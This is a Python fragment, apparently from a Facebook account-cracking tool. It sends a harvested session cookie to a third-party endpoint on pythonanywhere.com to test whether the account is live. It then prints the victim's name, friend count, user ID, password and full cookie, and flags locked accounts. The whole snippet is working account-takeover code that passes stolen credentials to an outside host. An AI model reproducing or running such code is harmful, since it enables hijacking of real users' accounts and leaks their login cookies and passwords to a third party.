url=f'https://mahdix.pythonanywhere.com/fbapi?cooki={coki}'
ckapi=requests.get(url).json()
lock=ckapi["Live"]
if 'True' in lock:
    print(mahdix.mahdilinx())
    print(f"{mahdix.LI_WHITE}Name : {mahdix.LI_YELLOW}{ckapi['name']}")
    print(f"Friends : {mahdix.LI_CYAN}{ckapi['friends']}")
    print(f'[MAHDI OK] {mahdix.LI_GREEN}{ckapi["uid"]}  | {ps}   | ==> {ckapi["c_date"]}')
    print(f'[💚]=COOKIE : {mahdix.LI_WHITE}'+coki)
if 'false' in lock:
    print('ID HASBEEN LOCKED ')
    print(f'[MAHDI OK]{ckapi["uid"]}  | {ps}   | ==> {ckapi["c_date"]}')
    print(f'[💚]=COOKIE : '+coki)
